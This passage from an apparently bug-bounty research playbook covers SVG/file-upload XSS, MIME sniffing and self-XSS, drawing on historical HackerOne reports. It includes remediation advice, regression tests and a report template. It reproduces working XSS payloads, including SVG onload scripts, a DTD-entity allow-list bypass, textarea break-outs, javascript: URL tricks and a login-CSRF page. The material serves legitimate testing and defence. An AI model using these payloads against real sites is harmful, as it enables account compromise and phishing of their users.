| Inline (no `Content-Disposition: attachment`) | rendered in origin | **active**, and same-origin for storage/cookie purposes |

Note the last row: a file served **inline** on the same origin is worse than one served
as an attachment, because it can also access same-origin storage. `HTML-005`
(`146278`, Nextcloud, log download) is the historical case where Firefox-on-Windows
offered to render a `text/plain` download as HTML — the team explained the mechanism
and concluded *"the document would only be executed locally."*

### 6. Test Cases and Proof-of-Concepts

#### 6.1 Historical payloads (verbatim from the cited reports)

| Case | Report | Payload / technique |
| --- | --- | --- |
| FILE-007 | `100565` | `<svg … onload="alert('script')">` with an embedded `<script><![CDATA[…]]></script>` |
| STOR-144 | `232174` | `<!DOCTYPE svg [<!ENTITY elem "">]>` + `<svg onload="alert(document.domain);">` |
| CONT-129 | `126197` | `.tar.gz` whose content begins `<html><script>alert(0)</script></html>` |
| BROW-006 | `191380` | upload a `.jpg`, then request the path with `:large` removed and `%23.html` appended |
| HTML-005 | `146278` | `Host: -->test"<img src=a onerror=alert('xss')>` to poison a log file later downloaded |

#### 6.2 Newly authored illustrations (not from the archive)

**Benign SVG marker** — sets `document.title`, no alert, no network:

````xml
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"
     onload="document.title='H1XSSMARKER9'">
  <text x="0" y="10">xss-marker</text>
</svg>
````

**DTD/entity probe** (concept sourced from `STOR-144`; verify on your own test host):

````xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg [ <!ENTITY elem "marker"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" onload="document.title='&elem;'">
  <text x="0" y="10">&elem;</text>
</svg>
````

**Extension/rename differential** — upload as `.jpg`, then request `path`, `path.jpg`,
`path.svg`, `path.html` and record the `Content-Type` of each.

**Header assertion script** (newly authored):

````bash
# newly authored — run against an authorised target
curl -sI "$FILE_URL" | grep -iE '^(content-type|content-disposition|x-content-type-options)'
````

**Safe proof.** Prefer `document.title='marker'` or a same-origin `fetch` to a
collaborator over `alert(1)`. `FILE-007`'s payload used a placeholder comment
(`// some exploit code here`) rather than a real exfiltration chain, which is the
responsible way to demonstrate the primitive.

### 7. Encoding, Filtering, and Parsing Behavior

| Control observed | Case | Verdict |
| --- | --- | --- |
| Re-serve uploads as `text/plain` | `FILE-012` | **sufficient** — the team's stated fix |
| SVG element/attribute allow-list | `STOR-144` | bypassed by DTD entity |
| `application/octet-stream`, no `nosniff` | `CONT-129` | sniffable → exploitable |
| Extension-based validation | `BROW-006` | bypassed by path rename |
| Image-only MIME preservation | `FILE-012`, `FILE-018` | the *bug* — SVG passes through |

The pattern is consistent: **controls were applied at the file, not at the response.**
Every bypass in this archive came from the browser interpreting the bytes differently
from whatever validated them.

### 8. Impact and Severity Considerations

| Report | Program | Severity | Bounty |
| --- | --- | --- | --- |
| `232174` STOR-144 | Shopify | high | $5,000 |
| `126197` CONT-129 | Uber | not disclosed | $750 |
| `191380` BROW-006 | Twitter | not disclosed | $1,680 |
| `212253` FILE-018 | Ubiquiti | medium | not disclosed |
| `148853` FILE-012 | Paragon Initiative | not disclosed | not disclosed |
| `213227` DOM-015 | Nextcloud | low | $250 (DOM, not upload) |

**Severity drivers, in order:**

1. **Same origin as the main site** > trusted subdomain > third-party host.
   `FILE-007`'s researcher argued the subdomain was a weak mitigation, not a defence.
2. **Cookies/storage reachable** from the serving origin. Check this; do not assume.
3. **Inline vs attachment.** Inline on the main origin is the worst case.
4. **Anonymous reachability.** `FILE-012`'s PoC needs nothing but the URL.

**Honest ceilings.** `HTML-005`'s team concluded the log-file injection
"would only be executed locally" — a correct self-limitation that shaped the rating.

### 9. False Positives and Limitations

- **"It's just an image file" is not a defence.** SVG is an image format and is
  parsed as a document. `FILE-007` demonstrates this directly.
- **"It's on a sandbox domain" needs testing, not asserting.** Measure what the origin
  can actually reach.
- **Stored ≠ served with a dangerous type.** Always inspect the response headers
  before reporting; a `text/plain` re-serve means there is no XSS.
- **Flash findings are historical.** Seven of this group's sources involve Flash.
  Flash is removed from all modern browsers; do not report a `.swf` XSS as a current
  issue without noting this.
- **Mime-sniffing is browser-specific.** `CONT-129`'s 256-byte scan is IE behaviour.
  Verify current browser behaviour, and check for `nosniff`, before claiming impact.
- **Third-party embeds.** Flash-player reports (`44512` Vimeo moogaloop,
  `200351` Zomato `flashmediaelement.swf`, `182160` PortSwigger) are vulnerabilities
  in the *embedding library*, and only in scope if that library is in scope. Attribute
  ownership carefully.
- **Do not report "file upload works" as XSS** — `CONT-129`'s underlying issue was a
  packaging workaround on PyPI, and the mirror merely served it.

### 10. Remediation and Regression Testing

#### 10.1 Remediation

Primary control, per the archive's own conclusion (`FILE-012`):

1. **Serve user uploads with a safe `Content-Type`.** `text/plain` is the safest
   general choice for arbitrary user content.
2. **Add `X-Content-Type-Options: nosniff`** on every response that serves user content.
3. **Add `Content-Disposition: attachment`** for anything the user should download
   rather than view.
4. **Serve uploads from a separate, cookie-less origin** with no access to the main
   site's storage. Combine with 1–3; do not rely on it alone.
5. **Set `Content-Security-Policy: sandbox`** on the serving origin or the response
   where supported.
6. **If SVG must be accepted**, sanitise it with a hardened XML parser that rejects
   DTDs and entities, then strip to an allow-list — and verify with the bypass in §6.2.
   `STOR-144` shows allow-lists alone are not sufficient.
7. **Never trust the extension**, and never infer type from it.
8. **Validate by re-parsing, not by filename.** Then serve with the header that matches
   what you actually allowed.

#### 10.2 Regression tests

| Test | Asserts |
| --- | --- |
| Upload benign SVG, fetch direct URL, assert `Content-Type` is not `image/svg+xml` | type safe |
| Same, assert `X-Content-Type-Options: nosniff` present | sniffing blocked |
| Same, assert `Content-Disposition` is `attachment` for binary types | inline rendering blocked |
| Upload SVG containing `<!DOCTYPE svg [<!ENTITY …>]>` | rejected or stripped |
| Fetch every uploaded file under `.svg`, `.html`, `.xml`, no-extension variants | type not inferred from extension |
| Embed a binary file containing `<html><script>` at offset 0 | not sniffed as HTML |
| From the serving origin, assert `document.cookie` and `localStorage` are unreachable | origin isolation |
| If SVGs are allowed, run the §6.2 probes against the rendered result | sanitiser holds |

### 11. Historical Bug Bounty Case Studies

Sourced facts only. Inventory: [`references/source-index.md`](../../references/source-index.md).

---

#### FILE-007 — Executing scripts on slack-files.com using SVG

- **Program:** Slack · **Report:** <https://hackerone.com/reports/100565>
- **Archive listing:** <https://h1.security.nathan.sx/slack.html>
- **Weakness:** `XSS - Generic` · **Severity / Bounty:** not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** file uploads on `slack-files.com`.

**Impact framing (researcher, verbatim):** *"Although `slack-files.com` is a sandbox
domain, there are many ways to gain the victim's trust during phishing attack. For
example, an attacker might render a fake log-in form with 'You need to sign in to see
this file' message and trick users into handing out their passwords."*

**Reproduction (as submitted):** create the SVG shown in §6.1 → upload to a channel or
DM → *"Click on message with just uploaded file."* The report also notes the file
*"can be shared via public link. In this case victim should click on image preview to
start script execute."*

**Expected behaviour (researcher):** *"Users expect that after clicking on message with
file they will see this file or file will b[e]…"* — i.e. the user's expectation is an
image, not a script-executing document.

---

#### FILE-012 — Stored XSS using SVG

- **Program:** Paragon Initiative Enterprises · **Report:** <https://hackerone.com/reports/148853>
- **Archive listing:** <https://h1.security.nathan.sx/paragonie.html>
- **Weakness:** `XSS - Generic` · **Severity / Bounty:** not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Researcher's mechanism, verbatim:**

> "If you uploads any file thet can use for XSS (HTML,SWF,etc) the content type will
> change to `text/plain; charset=us-ascii`. But for images it will stay the same. so if
> you upload SVG with JS content it will work fine! The
> `Content-Type: image/svg+xml; charset=us-ascii` header will make this attack works."

**Team resolution, verbatim:**

> "The way browsers handle SVG files is terrible. If you're serving SVG files that your
> users can upload, **only allow them to be served as `text/plain`**."

**Why it matters here:** the archive's clearest statement of the correct primary
remediation for this entire class, in a program's own words.

---

#### FILE-018 — XSS via SVG file

- **Program:** Ubiquiti Networks · **Report:** <https://hackerone.com/reports/212253>
- **Archive listing:** <https://h1.security.nathan.sx/ubnt.html>
- **Weakness:** `XSS - Generic` · **Severity:** medium · **Bounty:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** image upload to the community gallery at
`https://community.ubnt.com/t5/media/gallerypage/user-id/559584`, served via the
image server at `community.ubnt.com/t5/image/serverpage/...`.

**Researcher's description:** *"I was able to upload an svg file to here. so i uploaded
an SVG file with XSS on its code and if the attacker give the link to his victim he can
grab it's victim's cookie. and regarding to your Upload image svg file it uploaded even
it has an error.."*

**Impact as claimed:** cookie theft on the gallery host, from a shareable link.

**Proposed fix (researcher):** *"Dont allow to upload an svg file because attacker can
put his payload to a SVG files."* Rejection-by-type is one valid option;
`FILE-012`'s `text/plain` re-serve is the alternative where SVG must be supported.

---

#### STOR-144 — SVG allow-list bypass (Shopify sales channel icon)

- **Program:** Shopify · **Report:** <https://hackerone.com/reports/232174>
- **Severity:** high · **Bounty:** $5,000
- Full case study in [`Stored-XSS.md`](../../Stored-XSS.md) §11. Included here because the
  root cause is *inside the file format* rather than in the serving headers.

---

#### CONT-129 — XSS in archive.uber.com due to MIME sniffing in IE

- **Program:** Uber · **Report:** <https://hackerone.com/reports/126197>
- **Archive listing:** <https://h1.security.nathan.sx/uber.html>
- **Weakness:** `XSS - Generic` · **Bounty:** $750 · **Severity:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** the PyPI mirror at `archive.uber.com/pypi/simple/`, which
mirrors uploaded `.tar.gz` files with `Content-Type: application/octet-stream`.

**Mechanism (researcher, verbatim):**

> "The MIME type of all the `.tar.gz` files is `application/octet-stream`. Since the
> MIME type is not specified, browsers will automatically try to determine the type of
> the file. Chrome and Firefox both do so by looking the first few bytes of the file.
> Internet explorer scans the first 256 bytes of the file for `html` and if it finds
> `html` it will interpret the file as HTML. So by creating a `.tar.gz` that contains
> `<html><script>alert(0)</script></html>` one can inject javascript into the page."

**How the upload is achieved (researcher):** *"By default pypi doesn't allow you to
create the `.tar.gz` manually… This can be bypassed by first building the `.tar.gz` by
doing `python setup.py sdist` to build the `.tar.gz` before uploading it with an
external program."*

**Team summary, verbatim:** *"archive.uber.com mirrors pypi. When downloading `.tar.gz`
files from archive.uber.com, the MIME type is `application/octet-stream`. Injecting
`<html><script>alert(0)</script>` into the start of the `.tar.gz` causes an XSS in
Internet Explorer due to MIME sniffing."*

---

#### HTML-005 — Log pollution can lead to HTML Injection

- **Program:** Nextcloud · **Report:** <https://hackerone.com/reports/146278>
- **Archive listing:** <https://h1.security.nathan.sx/nextcloud.html>
- **Weakness:** `XSS - Generic` · **Bounty:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** the admin **log download** in the Nextcloud admin screen.

**PoC (as submitted):**
````
GET /nextcloud/index.php HTTP/1.1
Host: -->test"<img src=a onerror=alert('xss')>
User-Agent: Mozilla/5.0 (…)
````
Then download the log file and observe execution.

**Root cause (researcher):** the application inserts an HTML comment start tag when HTML
appears in the log, but the researcher *"was able to bypass this protection by inserting
a comment end tag and then the HTML code."*

**Team explanation, verbatim:** the log was delivered as JSON with an attachment
disposition forcing a download, *"However, Firefox running on Microsoft Windows would
offer the user to open the data in the browser as HTML document. Thus any injected data
in the log would be executed. While the document would only be executed locally…"*

---

### 12. Professional Vulnerability Report Template

`````markdown
# Stored XSS via SVG upload on <feature> — served as <content-type>

## Summary
<Feature> accepts SVG uploads. The file is served from <origin> with
`Content-Type: <type>` and no `X-Content-Type-Options`, so SVG script content
executes in <origin> when a victim opens the direct URL.

## Severity
<rating> — <origin trust, cookie/storage reachability, inline vs attachment>

## Affected endpoint
Upload: `<upload endpoint>` · Served from: `<file origin>` · Program: <name>

## Vulnerability details
### Response headers (the defect)
````
$ curl -sI "<uploaded file URL>"
HTTP/2 200
content-type: image/svg+xml
content-disposition: inline
x-content-type-options: <absent>
````

### Root cause
User uploads are served with a content type the browser parses as active content.

## Proof of concept
### Upload (benign marker)
````xml
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"
     onload="document.title='H1XSSMARKER9'"><text x="0" y="10">xss-marker</text></svg>
````

### Serve
1. Open `<file URL>` directly. `document.title` becomes `H1XSSMARKER9`.
2. Confirm origin `<origin>` in the console.

### Variants tested
| Path requested | Content-Type | Executes? |
| --- | --- | --- |
| `<url>` | `image/svg+xml` | yes |
| `<url>.html` | — | — |
| `<url>` with `%23.html` | — | — |

## Remediation
Serve uploads as `text/plain`, add `X-Content-Type-Options: nosniff` and
`Content-Disposition: attachment`; or reject SVG. See §10.1.

## Regression tests
<The header assertions in §10.2.>
`````

**Reporting discipline.** Always paste the **actual response headers** — the finding
lives there. State whether cookies/storage were reachable from the serving origin
rather than assuming. Disclose Flash or IE-specific dependencies.

### 13. References

- OWASP Cheat Sheet — File Upload: <https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html>
- OWASP — Unrestricted File Upload: <https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload/>
- MDN — `X-Content-Type-Options`: <https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Content-Type-Options>
- MDN — SVG as an image (`<img>` is safe; direct navigation is not): <https://developer.mozilla.org/en-US/docs/Web/SVG>
- W3C — Content-Type sniffing / MIME sniffing primer: <https://mimesniff.spec.whatwg.org/>
- Reports cited: <https://hackerone.com/reports/100565>, <https://hackerone.com/reports/148853>,
  <https://hackerone.com/reports/212253>, <https://hackerone.com/reports/232174>,
  <https://hackerone.com/reports/126197>, <https://hackerone.com/reports/146278>,
  <https://hackerone.com/reports/191380>

### 14. Research Gaps and Further Investigation

- **Flash-era reports dominate.** Seven of 18 sources are Flash, which is EOL. The
  *pattern* (a third-party media object pointed at attacker content) persists in
  browser extensions, WASM modules, and PDF viewers, but no source here covers those.
- **`HTML-005`'s Firefox-on-Windows behaviour is unverified today.** The mechanism is
  plausible but has not been re-tested; treat as historical.
- **Untested:** SVG sanitiser bypasses with modern libraries; `Content-Disposition`
  filename injection; polyglot files (valid image *and* valid HTML/SVG); PDF/Office
  active content; `<object>`/`<embed>` with `data:` URIs.
- **Origin-isolation claims were not verified.** Several reports assert a subdomain is
  a "sandbox". None test whether cookies, `localStorage`, or service workers are
  reachable from it. That is a measurable, high-value gap.
- **Suggested original research:** measure, across a sample of file-hosting
  subdomains, what same-origin resources remain reachable. The answer determines
  whether the "separate origin" mitigation is real.



---

<!-- PART 9 of 12 :: Self-XSS.md -->

## Self-XSS

### 1. Overview

Self-XSS is script execution that **only the injecting user can trigger**. In its pure
form it is a vulnerability in the *victim's browser*, not in the application: the
attacker must persuade the victim to paste a payload into their own session.

That framing is why self-XSS is usually low or informational — and why this playbook
exists at all. Self-XSS is not useless to a researcher. It is:

1. **Frequently the only remaining finding** after a program declines the "real" bug.
2. **A defect indicator** — an application that fails to encode its own user's input
   almost always fails on other users' input too. Every case here was found by testing
   a single-user field, and several sibling cases turned out to be genuine stored XSS.
3. **Chainable** — self-XSS becomes high severity when combined with CSRF, login CSRF,
   session fixation, or an attacker-controlled referrer.

All 24 sources were retrieved **with full report bodies** — the best-evidenced small
category in the knowledge base.

### 2. Root Cause and Technical Mechanics

The flow is identical to stored XSS except the victim and the attacker are the same
principal:

````
attacker pastes payload into their OWN field  →  stored/reflected
                                                →  only the attacker views it
````

#### 2.1 The three shapes found in this archive

**Shape A — paste-into-your-own-field.** `SELF-008` (`125059`, Uber partners): the
researcher set a *password* field to the payload `'>"><img src=x onmouseover =
prompt(document.domain)>` and it fired when they clicked "show password".

**Shape B — a UI action triggers your own stored value.** `SELF-014` (`164027`,
Nextcloud, $100): a comment containing
`</textarea><img src="s" onmouseover=alert(1)>` fires *"while clicking the EDIT BUTTON
that appears"* on hover — i.e. the reflection is in the **edit form**, populated from
your own comment.

**Shape C — a URL you construct executes in your own session.**
`SELF-021` (`212721`, HackerOne, $750): a `javascript:` URL placed in the Jira
integration *Base URL* input; clicking the generated `Test escalation URL` link
executes it in a new window with origin `hackerone.com`.

#### 2.2 The self-XSS-as-bug-class argument

`SELF-014`'s own type classification is worth reading closely. The researcher titled it
*"Reflected Self-XSS Vulnerability in the Comment section of Files Information"* and
typed it as `Vulnerability Type: Reflected XSS`. It was paid $100 — a low value
consistent with the self-XSS class rather than a rejection.

`SELF-021`'s researcher made the argument explicitly and well:

> "I wasn't sure if you would accept this report due to it being Self-XSS, but I
> figured it might be useful information **because it breaks one of the flows used to
> validate URLs**."

That is the correct framing: report the **broken validation flow**, with the self-XSS as
the demonstration. It reframes the finding from "you can hurt yourself" to "your URL
validator does not do its job," which is a real application defect.

#### 2.3 Self-XSS as a chain component

`SELF-018` (`171398`, HackerOne) is the archive's clearest chain analysis. The
reporter identified three issues in HackerOne's SSO-SAML flow, of which self-XSS was
the third:

> "Some stored Self-XSS's (internal areas accessed just by the victim, etc.) can be
> exploited through Login CSRF."
>
> ```
> Malicious page -> HackerOne Login CSRF -> Self-XSS triggers -> Logout -> Wait user actions
> ```
>
> "If the user interacts with the page (sign in with his account, etc.), the attacker
> can exploit…"

The same report also documented **login CSRF**, **information leak** ("steal all
information sent by the victim to the HackerOne website while using the malicious
session, including confidential bug reports"), and an **open redirect**
(`GET https://hackerone.com/users/saml/sign_in?email=…` redirects externally).

**This is the model.** A self-XSS report paired with login CSRF is a genuine
high-severity attack chain. A self-XSS report alone usually is not.

### 3. Attack Surface and Preconditions

| Surface | Case |
| --- | --- |
| Password / secret fields with a reveal toggle | `SELF-008` (Uber) |
| Comment **edit** forms | `SELF-014` (Nextcloud) |
| URL/base-URL configuration fields | `SELF-021` (HackerOne Jira integration) |
| Cookie-derived suggestions | `SELF-*` — `166709` (Yelp, city cookie field → location suggestions) |
| Error/installer steps | `SELF-*` — `170156`, `178611` (Revive Adserver) |
| Internal areas only the user can reach | `SELF-018` (HackerOne, internal sections) |

**Preconditions — always two or more:**
1. The attacker must convince the victim to paste a payload into their own session, **or**
2. A second primitive (CSRF, login CSRF, session fixation, referrer control) must
   deliver the payload, **or**
3. The application must have a flow that constructs and executes a URL without
   validating it.

### 4. Manual Testing Methodology

1. **Self-test in your own account first.** If it does not fire for you, it will not
   fire for anyone else either. Do not report a suspected self-XSS you have not
   reproduced.
2. **Then test the multi-user path immediately.** This is the high-value step and the
   one most researchers skip. If user B can trigger what user A stored, you have
   **stored XSS**, not self-XSS — re-file accordingly. Compare
   [`Stored-XSS.md`](../../Stored-XSS.md).
3. **Hunt the *flow*, not the payload.** Identify what capability the broken feature
   was supposed to provide (URL validation, input sanitisation, output escaping) and
   report **that** as the defect. `SELF-021`'s framing is the model.
4. **Look for the second primitive.** For every self-XSS, ask: can CSRF, login CSRF,
   session fixation, open redirect, or referrer control deliver this without victim
   interaction? `SELF-018` did exactly this and documented the chain.
5. **Check for a shared-referrer path.** If the field appears in a page reachable via
   an attacker-supplied referrer or a crafted link, the self-XSS may be triggerable.
6. **Test alternate triggers.** Shape B (`SELF-014`) fires only on a *specific UI
   action* — hover-then-edit. Test every re-render path of your own stored value, not
   only the primary view.

### 5. Input and Output Context Analysis

Contexts are the standard ones (see
[`Reflected-XSS.md`](../../Reflected-XSS.md) §5), with two self-XSS-specific observations:

| Observed context | Case | Break-out |
| --- | --- | --- |
| Password reveal / masked-input echo | `SELF-008` | `'>"><img src=x onmouseover=…>` |
| `<textarea>` re-populated from your own content | `SELF-014` | `</textarea><img src="s" onmouseover=alert(1)>` |
| `<a href>` built from a config field | `SELF-021` | `javascript://alert(document.domain);%2f%2f@` |
| Suggestion/autocomplete list from a cookie | `SELF-*` (`166709`) | field content |

`SELF-021`'s payload deserves note as a **URL-context** payload:
`javascript://alert(document.domain);%2f%2f@` — the `//` and trailing `%2f%2f@` are
there to satisfy URL parsers that expect `//host/path`, while the browser still
executes the `javascript:` scheme. This is the practical shape for testing whether a
"URL validation" feature actually validates the scheme.

`SELF-014`'s `</textarea>` break-out is the shape for any field re-populated into a
textarea — one of the most reliably exploitable contexts, because `</textarea>` is
rarely in blocklists while `<`, `>`, and quotes are.

### 6. Test Cases and Proof-of-Concepts

#### 6.1 Historical payloads (verbatim from the cited reports)

| Case | Report | Field | Payload as submitted |
| --- | --- | --- | --- |
| SELF-008 | `125059` | password | `'>"><img src=x onmouseover =prompt(document.domain)>` |
| SELF-014 | `164027` | comment | `</textarea><img src="s" onmouseover=alert(1)>` and `</textarea><script>alert(1)</script>` |
| SELF-021 | `212721` | Jira Base URL | `javascript://alert(document.domain);%2f%2f@` |

#### 6.2 Newly authored illustrations (not from the archive)

````text
# URL-validation feature probe (Shape C) — newly authored
javascript:alert(1)
javascript://alert(1)
javascript://alert(1);%2f%2f@
vbscript:alert(1)
data:text/html,<h1>xss-marker

# textarea re-population probe (Shape B) — newly authored
</textarea><img src=x onerror=alert(1)>
</textarea><h1>xss-marker

# masked-input reveal probe (Shape A) — newly authored
'><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
````

**Escalation test — do this first.** After reproducing the self-XSS, repeat the same
payload from a **second account** and check whether the first account can trigger it.
If yes, stop filing self-XSS and file [`Stored-XSS.md`](../../Stored-XSS.md).

### 7. Encoding, Filtering, and Parsing Behavior

Self-XSS shows the *same* encoding failures as every other class — there is no special
mechanism:

| Behaviour | Case |
| --- | --- |
| No encoding, masked-input echo | `SELF-008` |
| No encoding, textarea re-population | `SELF-014` |
| **No scheme validation on a URL field** | `SELF-021` |
| Present but defeatable via login CSRF | `SELF-018` |

`SELF-021` is the distinctive one, and it is not really an *encoding* problem. The
application validated that a string *looked like* a URL without validating its
**scheme**. The reporter identified the mechanism precisely:

> "the JSON value gets placed into an `<a href>` element on the page. It's possible to
> break the UR[l]…"

A URL field that accepts `javascript:` is a validation defect, not an XSS-encoding
defect. Diagnose it as such, and the fix is a scheme allow-list rather than HTML
encoding.

### 8. Impact and Severity Considerations

Recorded values from the archive:

| Report | Program | Severity | Bounty |
| --- | --- | --- | --- |
| `212721` SELF-021 | HackerOne | low | $750 |
| `164027` SELF-014 | Nextcloud | not disclosed | $100 |
| `171398` SELF-018 | HackerOne | low | not disclosed |

The spread is the point: `SELF-021` — a self-XSS that **breaks a URL validation
flow** — earned $750; `SELF-014` — a self-XSS with no additional argument — earned
$100. Both were paid.

**Rules that follow from the data:**

1. **Self-XSS alone: low/informational.** Expect no meaningful bounty.
2. **Self-XSS demonstrating a broken validation flow: low, but a real payment.** Lead
   with the flow.
3. **Self-XSS + a chain primitive: severity is the chain's severity.** `SELF-018`
   bundled login CSRF, information leak, and open redirect alongside the self-XSS; the
   chain is the finding.
4. **Never claim impact you did not demonstrate.** A common temptation is to assert
   that a victim who pastes a payload "loses their account." You have shown the
   opposite: you showed *you* can execute script in *your own* session. Say exactly
   that.

### 9. False Positives and Limitations

- **Test the multi-user path before filing as self-XSS.** Filing stored XSS as self-XSS
  is the most common mis-filing in this class, and it costs you the higher rating.
  Conversely, `SELF-014`'s researcher typed it as `Reflected XSS` and was paid.
- **Do not inflate.** "Victim pastes a payload and we take their account" is a
  *persuasion* claim, not a technical one.
- **Watch for a near-miss in the other direction.** Some programs accept self-XSS as
  informative; some reject it as not-a-vulnerability. The archive shows both payments
  and honest closures. State the class plainly in the title so triage can decide
  quickly.
- **`SELF-008`'s reporter pre-empted rejection**, writing: *"If valid then I hope, you
  will FIX ASAP"* and *"please close as informative"* as a fallback. Not required, but
  framing the ask honestly tends to produce better outcomes.
- **Distinguish from click-through-required "self-XSS"** that is really open redirect
  or tabnabbing. If the payload is a URL the victim must click, classify accordingly.

### 10. Remediation and Regression Testing

#### 10.1 Remediation

- **Encode the output.** Same rules as every other XSS class. The "only I can see it"
  framing does not exempt the output.
- **For URL/URL-validator features: enforce a scheme allow-list.** Parse the URL, then
  assert `protocol` is in `{http:, https:, mailto:}` as appropriate. Reject anything
  else — including values that merely *look* like URLs.
- **Never place untrusted values into `<a href>`.** Use `el.href = safeUrl` only after
  validation.
- **Apply the same controls to masked/reveal password fields and textarea re-population**
  — they are routinely overlooked because they are not "content" fields.
- **Fix CSRF/login-CSRF on state-changing flows** if you found a chain (`SELF-018`).
  This is what converts a non-issue into a real one.

#### 10.2 Regression tests

| Test | Asserts |
| --- | --- |
| Payload in every user-editable field, viewed by the same user | output encoded |
| Same payload stored by user A, viewed by user B | cross-user safe (catches re-filing as stored XSS) |
| `javascript:`, `data:`, `vbscript:` in every URL-accepting field | scheme allow-list |
| `javascript://host/path` variant specifically | scheme validated after parsing |
| Payload in password/secret reveal fields | encoded |
| Payload re-populated into `<textarea>` on edit | `</textarea>` neutralised |
| CSRF token present and enforced on state-changing flows | chain primitive removed |

The second row is the most valuable test in this table, and the one most teams lack.

### 11. Historical Bug Bounty Case Studies

Sourced facts only. All 24 sources were retrieved with full bodies. Inventory:
[`references/source-index.md`](../../references/source-index.md).

---

#### SELF-021 — IE 11 Self-XSS on Jira Integration Preview Base Link

- **Program:** HackerOne · **Report:** <https://hackerone.com/reports/212721>
- **Archive listing:** <https://h1.security.nathan.sx/security.html>
- **Weakness:** `XSS - Generic` · **Severity:** low · **Bounty:** $750
- **Body inspected:** Yes — **full report**.

**Researcher's framing, verbatim:** *"I wasn't sure if you would accept this report due
to it being Self-XSS, but I figured it might be useful information because it breaks one
of the flows used to validate URLs."*

**Affected feature:** Automation → Integrations → Jira → **Base URL** input on the
program configure-JIRA page, e.g. `https://hackerone.com/<program>/integrations/jira/edit`.

**Reproduction (as submitted):**
1. Launch IE 11; log into a HackerOne account that has **admin on a program**.
2. Set the Base URL input to `javascript://alert(document.domain);%2f%2f@`.
3. Fill the remaining required inputs with any data.
4. An AJAX request to `/jira_integrations/preview` returns JSON containing a URL in
   `example_escalation_url`.
5. That JSON value is placed into an `<a href>` element; the `Test escalation URL`
   link appears under "Section 2 Test Integration".
6. Click the link — *"You executed a JavaScript alert in a new window displaying the
   context as hackerone.com."*

**Root cause (researcher):** the returned URL is placed in an `<a href>` without
scheme validation, so a `javascript:` URL survives into a clickable link.

**Preconditions:** an account with **admin on a program**; and IE 11 per the
reporter's stated test environment.

**Why it matters here:** the highest-value self-XSS pattern in the archive — the bug is
the *validator*, not the payload, and the researcher's own framing is what made it
worth $750.

---

#### SELF-014 — Reflected Self-XSS in the Comment section of Files Information

- **Program:** Nextcloud · **Report:** <https://hackerone.com/reports/164027>
- **Archive listing:** <https://h1.security.nathan.sx/nextcloud.html>
- **Published:** recorded in the archive listing · **Weakness:** `XSS - Generic`
- **Bounty:** $100 · **Severity:** not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** `demo.nextcloud.com` → All Files → select a file → right-hand
details panel → **Comments**.

**Payloads (as submitted):**
````
</textarea><img src="s" onmouseover=alert(1)>
</textarea><script>alert(1)</script>
````

**Reproduction (as submitted):** paste the payload into the comment box, click **Post**,
then *"Click on the Edit Comments Button that will appear near the posted comment when
cursor was hovered over comment"* — *"THE APPLIED XSS PAYLOAD GETS EXECUTED WHILE
CLICKING THE EDIT BUTTON THAT APPEARS."*

**Root cause:** the comment is re-populated into a `<textarea>` on the edit path without
encoding, so `</textarea>` terminates the element.

**Researcher's own typing:** `Vulnerability Type: Reflected XSS`, `Vulnerability Found In
the test domain: demo.nextcloud.com`. It was paid at the self-XSS value of $100.

---

#### SELF-008 — Self-XSS on Password Reset Form

- **Program:** Uber · **Report:** <https://hackerone.com/reports/125059>
- **Archive listing:** <https://h1.security.nathan.sx/uber.html>
- **Weakness:** `XSS - Generic` · **Severity / Bounty:** not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** `https://partners.uber.com/` password-reset flow.

**Payload (as submitted):** `'>"><img src=x onmouseover =prompt(document.domain)>`

**Reproduction (as submitted):** request a password-reset link → open it → set the new
password to the payload → click **show password** — *"XSS got triaged."*

**Root cause:** the password field's value is echoed into the page (on reveal) without
encoding; both `'` and `"` break out.

**Researcher's closing request, verbatim:** *"If this is not valid then close as
informative please sir, am just reported this issue because this XSS on password reset
time"*.

---

#### SELF-018 — (HackerOne SSO-SAML) Login CSRF, Open Redirect, and Self-XSS

- **Program:** HackerOne · **Report:** <https://hackerone.com/reports/171398>
- **Archive listing:** <https://h1.security.nathan.sx/security.html>
- **Weakness:** `XSS - Generic` · **Severity:** low · **Bounty:** not disclosed
- **Body inspected:** Yes — **full report**.

**PoC (source as submitted, redacted fields preserved):**
````html
<html>
<body>
	<iframe id="login_csrf_frame" src="████████" style="width:0;height:0;border:0;border:none;"></iframe>
	<script>
		setTimeout(function(){document.location.href = "https://hackerone.com/users/saml/sign_in?email=████&remember_me=true";}, 5000);
	</script>
</body>
</html>
````

**Impact as claimed by the researcher, verbatim:**

> "1) **Information Leak** — An attacker can use Logout CSRF + Login CSRF against a
> victim to steal all information sent by the victim to the HackerOne website while
> using the malicious session, including confidential bug reports.
>
> 2) **Open Redirect** — Since the SSO-SAML login flow can be started automatically
> (`GET https://hackerone.com/users/saml/sign_in?email=…`) by an attacker and it
> redirects to external URLs, the attacker can redirect the user to anywhere.
>
> 3) **Self-XSS Possible Exploitation** — Some stored Self-XSS's (internal areas
> accessed just by the victim, etc.) can be exploited through Login CSRF."
>
> ```
> Malicious page -> HackerOne Login CSRF -> Self-XSS triggers -> Logout -> Wait user actions
> ```
>
> "If the user interacts with the page (sign in with his account, etc.), the attacker
> can exploit…"

**Why it matters here:** the clearest archived demonstration that self-XSS is a *chain
component*. The self-XSS is item 3 of 3 and the weakest on its own; bundled with login
CSRF and an open redirect, the report describes a real attack.

---

#### Supporting self-XSS sources (full bodies retrieved)

- `166709` — <https://hackerone.com/reports/166709> — Yelp. Self-XSS via a **cookie
  city field** used in location suggestions; note the source is a cookie, which is
  attacker-writable in other scenarios.
- `170156` — <https://hackerone.com/reports/170156> — Revive Adserver. Reflected XSS in
  Step 2 of the installation flow.
